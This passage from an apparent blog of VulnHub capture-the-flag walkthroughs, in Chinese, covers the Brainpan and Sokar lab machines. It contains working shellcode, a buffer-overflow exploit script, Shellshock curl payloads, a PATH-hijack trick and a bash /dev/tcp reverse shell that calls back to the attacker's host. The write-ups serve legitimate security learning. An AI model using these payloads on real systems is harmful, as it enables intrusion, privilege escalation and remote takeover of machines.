"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
)

print trash+ret_addr+shellcode
</code></pre>

<p>送出之後會發現伺服器沒有回應，接著來連看看被綁定的1337 port</p>

<pre><code>root@kali:~# nc -v 192.168.2.155 1337
192.168.2.155: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.2.155] 1337 (?) open
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
</code></pre>

<p>成功拿到shell了，先來看看有沒有sudo權限</p>

<pre><code>puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
</code></pre>

<p>看來puck可以執行在anansi目錄下的一個anansi_util</p>

<pre><code>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
- network
- proclist
- manual [command]
</code></pre>

<p>玩弄anansi_util發現試不出甚麼名堂，來找找anansi有沒有其他程式</p>

<pre><code>puck@brainpan:/home/puck$ find / -user anansi 2&gt;/dev/null
find / -user anansi 2&gt;/dev/null
/usr/local/bin/validate
/home/anansi

puck@brainpan:/home/puck/web$ ls -al /usr/local/bin/validate
ls -al /usr/local/bin/validate
-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate

puck@brainpan:/home/puck$ /usr/local/bin/validate
/usr/local/bin/validate
usage /usr/local/bin/validate &lt;input&gt;

puck@brainpan:/home/puck$ /usr/local/bin/validate 123
/usr/local/bin/validate 123
validating input...passed.
</code></pre>

<p>/usr/local/bin/validate 是個設有sticky bit的程式，不過執行之後試不出東西，在brainpan上面gdb也不能用，只好把它複製到/home/puck/web再回Kali Linux用gdb看</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# gdb -q validate
Reading symbols from /root/_Sec/vulnhub/brainpan/validate...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
</code></pre>

<p>看起來沒有甚麼安全性的設定，看一下有哪些函式可以用</p>

<pre><code>gdb-peda$ info functions
All defined functions:

File validate.c:
int main(int, char **);
char *validate(char *);

Non-debugging symbols:
0x0804834c  _init
0x0804838c  __gmon_start__
0x0804838c  __gmon_start__@plt
0x0804839c  __libc_start_main
0x0804839c  __libc_start_main@plt
0x080483ac  strlen
0x080483ac  strlen@plt
0x080483bc  strcpy
0x080483bc  strcpy@plt
0x080483cc  printf
0x080483cc  printf@plt
0x080483dc  puts
0x080483dc  puts@plt
0x080483ec  exit
0x080483ec  exit@plt
0x08048400  _start
0x08048430  __do_global_dtors_aux
0x08048490  frame_dummy
0x080485a0  __libc_csu_fini
0x080485b0  __libc_csu_init
0x0804860a  __i686.get_pc_thunk.bx
0x08048610  __do_global_ctors_aux
0x0804863c  _fini
</code></pre>

<p>validate看起來應該是驗證輸入用的，接著看一下反組譯的結果</p>

<pre><code>gdb-peda$ disas validate
Dump of assembler code for function validate:
   0x080484b4 &lt;+0&gt;:     push   ebp
   0x080484b5 &lt;+1&gt;:     mov    ebp,esp
   0x080484b7 &lt;+3&gt;:     push   ebx
   0x080484b8 &lt;+4&gt;:     sub    esp,0x84
   0x080484be &lt;+10&gt;:    mov    DWORD PTR [ebp-0xc],0x0
   0x080484c5 &lt;+17&gt;:    mov    DWORD PTR [ebp-0xc],0x0
   0x080484cc &lt;+24&gt;:    jmp    0x8048508 &lt;validate+84&gt;
   0x080484ce &lt;+26&gt;:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484d1 &lt;+29&gt;:    add    eax,DWORD PTR [ebp+0x8]
   0x080484d4 &lt;+32&gt;:    movzx  eax,BYTE PTR [eax]
   0x080484d7 &lt;+35&gt;:    cmp    al,0x46
   0x080484d9 &lt;+37&gt;:    jne    0x8048504 &lt;validate+80&gt;
   0x080484db &lt;+39&gt;:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484de &lt;+42&gt;:    add    eax,DWORD PTR [ebp+0x8]
   0x080484e1 &lt;+45&gt;:    movzx  eax,BYTE PTR [eax]
   0x080484e4 &lt;+48&gt;:    movsx  edx,al
   0x080484e7 &lt;+51&gt;:    mov    eax,0x8048660
   0x080484ec &lt;+56&gt;:    mov    DWORD PTR [esp+0x4],edx
   0x080484f0 &lt;+60&gt;:    mov    DWORD PTR [esp],eax
   0x080484f3 &lt;+63&gt;:    call   0x80483cc &lt;printf@plt&gt;
   0x080484f8 &lt;+68&gt;:    mov    DWORD PTR [esp],0x1
   0x080484ff &lt;+75&gt;:    call   0x80483ec &lt;exit@plt&gt;
   0x08048504 &lt;+80&gt;:    add    DWORD PTR [ebp-0xc],0x1
   0x08048508 &lt;+84&gt;:    mov    ebx,DWORD PTR [ebp-0xc]
   0x0804850b &lt;+87&gt;:    mov    eax,DWORD PTR [ebp+0x8]
   0x0804850e &lt;+90&gt;:    mov    DWORD PTR [esp],eax
   0x08048511 &lt;+93&gt;:    call   0x80483ac &lt;strlen@plt&gt;
   0x08048516 &lt;+98&gt;:    cmp    ebx,eax
   0x08048518 &lt;+100&gt;:   jb     0x80484ce &lt;validate+26&gt;
   0x0804851a &lt;+102&gt;:   mov    eax,DWORD PTR [ebp+0x8]
   0x0804851d &lt;+105&gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048521 &lt;+109&gt;:   lea    eax,[ebp-0x70]
   0x08048524 &lt;+112&gt;:   mov    DWORD PTR [esp],eax
   0x08048527 &lt;+115&gt;:   call   0x80483bc &lt;strcpy@plt&gt;
   0x0804852c &lt;+120&gt;:   lea    eax,[ebp-0x70]
   0x0804852f &lt;+123&gt;:   add    esp,0x84
   0x08048535 &lt;+129&gt;:   pop    ebx
   0x08048536 &lt;+130&gt;:   pop    ebp
   0x08048537 &lt;+131&gt;:   ret
End of assembler dump.
</code></pre>

<p>validate就只是驗證輸入的字串的裡面有沒有出現&#8221;F&#8221;(0x46)，有出現&#8221;F&#8221;就是驗證失敗</p>

<p>這個程式就這麼簡單，不過因為它有設定sticky bits，接下來試試看有沒有buffer overflow可以利用來取得anansi的shell</p>

<pre><code>gdb-peda$ r `python -c 'print "A"*200'`

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcab8 ('A' &lt;repeats 200 times&gt;...)
EBX: 0x41414141 ('AAAA')
ECX: 0x0
EDX: 0xbb9
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcb30 ('A' &lt;repeats 200 times&gt;...)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
</code></pre>

<p>eip被塞滿了A，接下來看看有沒有JMP ESP可以利用</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# msfelfscan -j esp validate
[validate]
</code></pre>

<p>空無一物，不過看到EAX也被輸入的A給塞滿了，再來找一下有沒有JMP EAX可以用</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# msfelfscan -j eax validate
[validate]
0x080484af call eax
0x0804862b call eax
</code></pre>

<p>有兩個可以用，接著只要找到return adrdress之後跟shellcode當作參數傳入後應該就能拿到shell了</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# /usr/share/metasploit-framework/tools/pattern_create.rb 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
root@kali:~/_Sec/vulnhub/brainpan# gdb -q ./validate
Reading symbols from /root/_Sec/vulnhub/brainpan/validate...done.
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

Program received signal SIGSEGV, Segmentation fault.
.....
0x39644138 in ?? ()
gdb-peda$ q
root@kali:~/_Sec/vulnhub/brainpan# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x39644138
[*] Exact match at offset 116
</code></pre>

<p>算出來return address的位置在116，接下來要找一個字串長度在116個字以內的<a href="http://shell-storm.org/shellcode/files/shellcode-606.php">shellcode</a>串成要用的exploit</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# cat shell_exp.py
#!/usr/bin/python

shellcode=(
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
"\x51\x53\x89\xe1\xcd\x80"
)

nop="\x90"*(116-len(shellcode))

ret_addr="\xaf\x94\x04\x08"

print shellcode+nop+ret_addr

root@kali:~/_Sec/vulnhub/brainpan# ./validate `python shell_exp.py`
root@kali:/root/_Sec/vulnhub/brainpan#
</code></pre>

<p>成功執行了/bin/sh，接下來實際到brainpan上面試試</p>

<pre><code>puck@brainpan:/home/puck$ /usr/local/bin/validate  `python shell_exp.py`
/usr/local/bin/validate  `python shell_exp.py`
bash-4.2$ id
id
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
</code></pre>

<p>拿到了anansi的權限，我們就可以去修改anansi_util，讓它變成一支可以產生shell的程式，最後再回到puck用sudo(root權限)執行</p>

<pre><code>bash-4.2$ cat anansi_util
cat anansi_util
i#!/usr/bin/python

import pty
pty.spawn("/bin/bash")
bash-4.2$ chmod +x anansi_util
chmod +x anansi_util
bash-4.2$ exit
exit
exit
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
root@brainpan:/home/puck# id
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<p>打完收工:) 再找時間玩玩Brainpan 2</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Sokar]]></title>
    <link href="http://newdominic.github.io/blog/2015/03/02/Sokar/"/>
    <updated>2015-03-02T00:57:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/03/02/Sokar</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/sokar-1,113/">Sokar</a>是<a href="https://www.vulnhub.com/">Vulnhub</a>在<a href="http://blog.vulnhub.com/competition-sokar/">2015年第一次競賽</a>中使用的機器，作者是<a href="https://www.vulnhub.com/author/rasta-mouse,77/">Rasta Mouse</a></p>

<!--more-->


<hr />

<p>先用nmap掃瞄一遍目標機器，發現在591 port有架http server</p>

<pre><code>Starting Nmap 6.46 ( http://nmap.org ) at 2015-01-01 09:57 EST
Nmap scan report for 192.168.2.154
Host is up (0.00058s latency).
Not shown: 65534 filtered ports
PORT    STATE SERVICE VERSION
591/tcp open  http    Apache httpd 2.2.15 ((CentOS))
MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1187.08 seconds
</code></pre>

<p><img class="left" src="http://newdominic.github.io/images/2015-03-02-sokar/591.png"></p>

<p>連上 <a href="http://192.168.2.154:591">http://192.168.2.154:591</a> 之後，首頁出現了這台機器的資訊，看起來是跑了date、uptime、netstat和iostat的結果</p>

<p>F5多刷幾次會發現這個狀態是每分鐘更新一次，猜測應該有用crontab跑排程</p>

<p>再看一下網頁原始碼，知道是跑這支cgi程式 <a href="http://192.168.2.154:591/cgi-bin/cat">http://192.168.2.154:591/cgi-bin/cat</a></p>

<p>對於再來要做甚麼有點沒頭緒，直接來試試去年很夯的Shellshock</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sokar# curl -A <span class="s2">&quot;() { :; }; echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/ls /home;&quot;</span> http://192.168.2.154:591/cgi-bin/cat                 
apophis
bynarr</code></pre></div>


<p>..隨便就矇中啦XD！寫個script讓操作可以輕鬆點</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sokar# cat exp.sh
<span class="c">#!/bin/bash</span>

<span class="nb">shopt</span> -s extglob
<span class="nv">usr_bin</span><span class="o">=</span><span class="s1">&#39;+(id|whoami|wget|uptime)&#39;</span> <span class="c">#執行檔的路徑要自己設定</span>

<span class="k">while</span> <span class="o">[</span> <span class="m">1</span> -gt <span class="m">0</span> <span class="o">]</span>
<span class="k">do</span>

<span class="nb">echo</span> -n <span class="s2">&quot;[apache@sokar] &quot;</span> <span class="c">#假裝自己是個shell...</span>
<span class="nb">read </span>cmd

<span class="nv">prefix</span><span class="o">=</span><span class="s2">&quot;/bin/&quot;</span>
<span class="nv">bin</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$cmd</span> <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span><span class="sb">`</span>
<span class="k">case</span> <span class="nv">$bin</span> in
<span class="nv">$usr_bin</span><span class="o">)</span>
    <span class="nv">prefix</span><span class="o">=</span><span class="s2">&quot;/usr/bin/&quot;</span><span class="p">;;</span>
<span class="k">esac</span>

<span class="nv">final_cmd</span><span class="o">=</span><span class="nv">$prefix$cmd</span>

<span class="nv">line</span><span class="o">=</span><span class="s2">&quot;() { :; }; echo \&quot;Content-type: text/plain\&quot;; echo; $final_cmd;&quot;</span>
curl -A <span class="s2">&quot;$line&quot;</span> http://192.168.2.154:591/cgi-bin/cat


<span class="k">done</span></code></pre></div>


<p>先來看看/cgi-bin/cat到底做了哪些事情</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span> cat cat
<span class="c">#!/bin/bash</span>

<span class="nb">echo</span> <span class="s2">&quot;Content-type: text/html&quot;</span><span class="p">;</span>
<span class="nb">echo</span> <span class="s2">&quot;&quot;</span>

/bin/cat <span class="s">&lt;&lt; EOM</span>
<span class="s">&lt;pre&gt;</span>
<span class="s">EOM</span>

<span class="nb">echo</span> <span class="sb">`</span>date<span class="sb">`</span>
<span class="nb">echo</span> <span class="sb">`</span>uptime<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">&quot;&lt;br /&gt;&quot;</span>
/bin/cat /tmp/stats

/bin/cat <span class="s">&lt;&lt; EOM</span>
<span class="s">&lt;/pre&gt;</span>
<span class="s">EOM</span></code></pre></div>


<p>他即時執行了date和uptime，看起來netstat和iostat的資訊就是排程執行後存在/tmp/stats裡面</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span> cat /tmp/stats
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address               Foreign Address             State
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:36163         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:35913         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:36490         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:36186         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:36789         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:35907         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> :::591                      :::*                        LISTEN
tcp        <span class="m">0</span>      <span class="m">0</span> ::ffff:192.168.2.154:591    ::ffff:192.168.2.128:52364  TIME_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> ::ffff:192.168.2.154:591    ::ffff:192.168.2.128:52363  TIME_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> ::ffff:192.168.2.154:591    ::ffff:192.168.2.128:52367  TIME_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> ::ffff:192.168.2.154:591    ::ffff:192.168.2.128:52366  TIME_WAIT
udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:68                  0.0.0.0:*
Active UNIX domain sockets <span class="o">(</span>servers and established<span class="o">)</span>
Proto RefCnt Flags       Type       State         I-Node Path
unix  <span class="m">9</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    <span class="m">8239</span>   /dev/log
unix  <span class="m">2</span>      <span class="o">[</span> ACC <span class="o">]</span>     STREAM     LISTENING     <span class="m">6863</span>   @/com/ubuntu/upstart
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    <span class="m">7006</span>   @/org/kernel/udev/udevd
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    49323
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    37526
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    36381
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    26496
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    26128
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    9264
unix  <span class="m">2</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    8406
unix  <span class="m">3</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    7022
unix  <span class="m">3</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    7021

Linux 2.6.32-504.1.3.el6.x86_64 <span class="o">(</span>sokar<span class="o">)</span>         02/28/2015      _x86_64_        <span class="o">(</span><span class="m">1</span> CPU<span class="o">)</span>

avg-cpu:  %user   %nice %system %iowait  %steal   %idle
          39.39    0.00   29.65    0.04    0.00   30.92

Device:            tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn
sda               1.00        29.04        20.94    <span class="m">1922802</span>    1386464
sdb               0.01         0.04         0.01       <span class="m">2710</span>        754</code></pre></div>


<p>繼續找找這台機器上其他的資訊，找到了/var/spool/mail/bynarr，得到了bynarr的密碼&#8221;fruity&#8221;，並且知道bynarr可以連結外部的51242 port</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span>: cat /var/spool/mail/bynarr
Return-Path: &lt;root@sokar&gt;
Delivered-To: bynarr@localhost
Received:  from root by localhost
To: &lt;bynarr@sokar&gt;
Date: Thu, <span class="m">13</span> Nov <span class="m">2014</span> 22:04:31 +0100
Subject: Welcome

Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
A user account has been setup <span class="k">for</span> you.

UID <span class="m">500</span> <span class="o">(</span>bynarr<span class="o">)</span>
GID <span class="m">500</span> <span class="o">(</span>bynarr<span class="o">)</span>
        <span class="m">501</span> <span class="o">(</span>forensic<span class="o">)</span>

Password <span class="s1">&#39;fruity&#39;</span>.  Please change this ASAP.
Should you require, you<span class="err">&#39;</span>ve been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out <span class="k">for</span> analysis.

All the best in your new role!

  -Sokar-</code></pre></div>


<p>再研究一下bynarr的家目錄(/home/bynarr)，會發現.bash_profile有一行</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>:<span class="nv">$HOME</span>/bin</code></pre></div>


<p>bynarr的家目錄被設成PATH的第一順位</p>

<p>接下來嘗試看看能不能在家目錄用同名的程式來取代原本列出狀態用的程式(netstat和iostat)</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span>: <span class="nb">echo</span> <span class="s2">&quot;#!/bin/bash&quot;</span> &gt; /home/bynarr/netstat
<span class="o">[</span>apache@sokar<span class="o">]</span>: <span class="nb">echo</span> <span class="s2">&quot;echo netstat&quot;</span> &gt;&gt; /home/bynarr/netstat
<span class="o">[</span>apache@sokar<span class="o">]</span>: <span class="nb">echo</span> <span class="s2">&quot;#!/bin/bash&quot;</span> &gt; /home/bynarr/iostat
<span class="o">[</span>apache@sokar<span class="o">]</span>: <span class="nb">echo</span> <span class="s2">&quot;echo iostat&quot;</span> &gt;&gt; /home/bynarr/iostat
<span class="o">[</span>apache@sokar<span class="o">]</span>: chmod +x /home/bynarr/netstat
<span class="o">[</span>apache@sokar<span class="o">]</span>: chmod +x /home/bynarr/iostat</code></pre></div>


<p>建完檔案等排程時間到了之後再重整一下首頁，就會發現iostat被替換成自己建立的偽‧iostat</p>

<p><img class="left" src="http://newdominic.github.io/images/2015-03-02-sokar/iostat.PNG"></p>

<p>再來就要靠這個偽‧iostat來取得bynarr的reverse shell</p>

<p>先在Kali上面監聽51242這個port後，再去修改一下/home/bynarr/iostat的內容</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span> <span class="nb">echo</span> <span class="s2">&quot;!#/bin/bash&quot;</span> &gt; /home/bynarr/iostat
<span class="o">[</span>apache@sokar<span class="o">]</span> <span class="nb">echo</span> <span class="s2">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.2.128/51242 0&gt;&amp;1&quot;</span> &gt;&gt; /home/bynarr/iostat</code></pre></div>


<p>等排程時間一到，就拿到bynarr的shell了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sokar# nc -lvp 51242
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">51242</span> ...
192.168.2.154: inverse host lookup failed: Unknown server error : Connection timed out
connect to <span class="o">[</span>192.168.2.128<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.2.154<span class="o">]</span> 36824
bash: no job control in this shell
<span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="err">$</span></code></pre></div>


<p>拿到bynarr的shell之後，先來看一下他有沒有sudo的權限</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>sudo -l
sudo -l
Matching Defaults entries <span class="k">for</span> bynarr on this host:
    !requiretty, visiblepw, always_set_home, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">&quot;COLORS</span>
<span class="s2">    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;MAIL PS1</span>
<span class="s2">    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_COLLATE</span>
<span class="s2">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_MONETARY</span>
<span class="s2">    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>, env_keep+<span class="o">=</span><span class="s2">&quot;LC_TIME LC_ALL</span>
<span class="s2">    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
 
User bynarr may run the following commands on this host:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /home/bynarr/lime</code></pre></div>


<p>執行lime時可以選擇要掛載或卸除lime.ko的核心模組，這邊就直接掛載上去</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>sudo /home/bynarr/lime
sudo /home/bynarr/lime
<span class="o">==========================</span>
Linux Memory <span class="nv">Extractorator</span>
<span class="o">==========================</span>
LKM, add or remove?
&gt; remove
<span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>sudo /home/bynarr/lime
sudo /home/bynarr/lime
<span class="o">==========================</span>
Linux Memory <span class="nv">Extractorator</span>
<span class="o">==========================</span>
LKM, add or remove?
&gt; add</code></pre></div>


<p>lime掛載上去後，會把記憶體dump到/tmp/ram，而看起來/tmp/ram的內容還有一些可讀的字串</p>

<p>來看看能不能從這些字串中得到其他使用者的資訊</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>bynarr@sokar tmp<span class="o">]</span><span class="nv">$ </span>strings ram <span class="p">|</span> grep apophis
strings ram <span class="p">|</span> grep apophis
